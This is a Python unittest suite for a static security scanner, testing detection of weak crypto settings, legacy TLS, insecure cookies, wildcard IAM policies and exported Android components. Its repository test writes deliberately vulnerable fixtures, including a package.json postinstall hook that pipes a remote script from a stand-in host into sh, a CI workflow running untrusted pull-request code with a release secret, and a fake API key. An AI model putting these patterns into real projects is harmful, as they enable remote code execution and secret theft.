from __future__ import annotations

import json
from pathlib import Path
import tempfile
import unittest

import security_intelligence
import security_taxonomy


class SecurityIntelligencePrecisionTests(unittest.TestCase):
    def rules(self, rows):
        return {row["rule"] for row in rows}

    def test_pbkdf2_reads_actual_iteration_argument(self):
        safe = "import hashlib\nhashlib.pbkdf2_hmac('sha256', password, salt, 600000)\n"
        weak = "import hashlib\nhashlib.pbkdf2_hmac('sha256', password, salt, 9999)\n"
        self.assertNotIn("secctx-weak-pbkdf2-iterations",
                         self.rules(security_intelligence._scan_crypto_auth(safe, "safe.py")))
        self.assertIn("secctx-weak-pbkdf2-iterations",
                      self.rules(security_intelligence._scan_crypto_auth(weak, "weak.py")))

    def test_tls_12_and_13_do_not_match_legacy_protocol_rule(self):
        safe = "ssl_protocols TLSv1.2 TLSv1.3;\n"
        unsafe = "ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n"
        self.assertNotIn("secctx-legacy-tls-protocol",
                         self.rules(security_intelligence._scan_web_api(safe, "nginx.conf")))
        self.assertIn("secctx-legacy-tls-protocol",
                      self.rules(security_intelligence._scan_web_api(unsafe, "nginx.conf")))

    def test_cookie_calls_do_not_bleed_into_each_other(self):
        safe = "response.set_cookie('one', value, secure=True)\nother(secure=False)\n"
        unsafe = "response.set_cookie('session', value, secure=False, httponly=True)\n"
        self.assertNotIn("secctx-insecure-auth-cookie",
                         self.rules(security_intelligence._scan_web_api(safe, "app.py")))
        self.assertIn("secctx-insecure-auth-cookie",
                      self.rules(security_intelligence._scan_web_api(unsafe, "app.py")))

    def test_quoted_iam_pair_is_one_object_not_cross_object(self):
        unsafe = json.dumps({"Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]})
        safe = json.dumps({"Statement": [{"Effect": "Allow", "Action": "s3:GetObject", "Resource": "*"},
                                         {"Effect": "Allow", "Action": "*", "Resource": "arn:aws:s3:::bucket"}]})
        self.assertIn("secctx-cloud-wildcard-iam",
                      self.rules(security_intelligence._scan_iac_cloud(unsafe, "policy.json", ".json")))
        self.assertNotIn("secctx-cloud-wildcard-iam",
                         self.rules(security_intelligence._scan_iac_cloud(safe, "policy.json", ".json")))

    def test_android_inherited_and_provider_permissions_are_honored(self):
        prefix = '<manifest xmlns:android="http://schemas.android.com/apk/res/android">'
        safe_app = prefix + '<application android:permission="com.example.SIGNATURE"><service android:exported="true"/></application></manifest>'
        safe_provider = prefix + '<application><provider android:exported="true" android:readPermission="com.example.READ"/></application></manifest>'
        unsafe = prefix + '<application><receiver android:exported="true"/></application></manifest>'
        for manifest in (safe_app, safe_provider):
            self.assertNotIn("secctx-android-exported-component",
                             self.rules(security_intelligence._scan_mobile(manifest, "AndroidManifest.xml", "AndroidManifest.xml")))
        self.assertIn("secctx-android-exported-component",
                      self.rules(security_intelligence._scan_mobile(unsafe, "AndroidManifest.xml", "AndroidManifest.xml")))

    def test_cwe_exact_mapping_precedes_secret_keyword(self):
        row = security_taxonomy.enrich_taxonomy({"cwe": "CWE-798", "category": "secrets",
                                                  "rule": "hardcoded-secret", "owasp": ""})
        self.assertEqual(row["owasp_2025"], "A07:2025 Authentication Failures")
        xss = security_taxonomy.enrich_taxonomy({"cwe": "CWE-79", "category": "web",
                                                 "rule": "xss", "owasp": ""})
        self.assertEqual(xss["cwe_top25_2025_rank"], 1)
        self.assertGreater(xss["cwe_priority_factor"], 1.0)


class SecurityIntelligenceRepositoryTests(unittest.TestCase):
    def rules(self, rows):
        return {row["rule"] for row in rows}

    def write(self, root: Path, relative: str, text: str):
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")

    def test_repository_context_attack_paths_and_supply_chain(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, ".github/workflows/pr.yml", """
on:
  pull_request_target:
permissions: write-all
jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./ci.sh
        env:
          TOKEN: ${{ secrets.RELEASE_TOKEN }}
""")
            self.write(root, "main.tf", """
resource "aws_security_group_rule" "ssh" {
  from_port = 22
  to_port = 22
  cidr_blocks = ["0.0.0.0/0"]
}
""")
            self.write(root, "Dockerfile", "FROM python:latest\nUSER root\n")
            self.write(root, "package.json", json.dumps({
                "dependencies": {"tool": "git+https://example.invalid/tool.git#main"},
                "scripts": {"postinstall": "curl https://example.invalid/i | sh"},
            }))
            secret = "sk-proj-" + "Ab9_" * 15
            self.write(root, ".env", "OPENAI_API_KEY=" + secret + "\n")
            report = security_intelligence.analyze(root)
        rules = self.rules(report["findings"])
        self.assertIn("secctx-pr-target-untrusted-execution", rules)
        self.assertIn("secctx-tf-public-admin-service", rules)
        self.assertIn("secctx-container-mutable-base", rules)
        self.assertIn("secctx-install-hook-remote-shell", rules)
        self.assertTrue(report["trust_boundaries"])
        self.assertTrue(report["attack_paths"])
        self.assertGreater(report["attack_surface"]["total"], 0)
        self.assertEqual(report["supply_chain"]["github_action_refs"]["mutable"], 1)
        self.assertTrue(report["assurance"]["offline_only"])
        self.assertFalse(report["assurance"]["raw_secret_material_in_output"])
        self.assertNotIn(secret, json.dumps(report))


if __name__ == "__main__":
    unittest.main()
